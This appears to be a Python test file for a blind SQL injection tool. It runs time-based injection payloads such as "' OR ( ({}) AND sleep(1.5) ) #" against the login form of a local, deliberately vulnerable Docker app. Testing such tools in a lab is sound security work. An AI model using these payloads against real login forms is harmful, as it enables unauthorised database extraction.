import logging
import requests
from unittest import TestCase
from pyic import BlindStringFinder, SqliEncoder, TimeBlindTester

logging.basicConfig(level=logging.DEBUG)


class TestTimeBasedBlindStringFinder(TestCase):
    """
    This test need the docker sqli in https://github.com/NeuronAddict/vulnerable-apps.git running
    """

    def setUp(self):
        self.tester = TimeBlindTester(
            lambda payload: requests.post('http://127.0.0.1:8181/login.php', data={'login': 'admin',
                                                                                   'pass': "' OR ( ({}) AND sleep(1.5) ) #".format(
                                                                                       payload)}),
            1.3, 1.5
        )

        self.string_finder = BlindStringFinder(self.tester)

    def test_all(self):

        self.assertFalse(self.tester.test('1=0'))

        self.assertTrue(self.tester.test('1=1'))

        self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         'coucou')

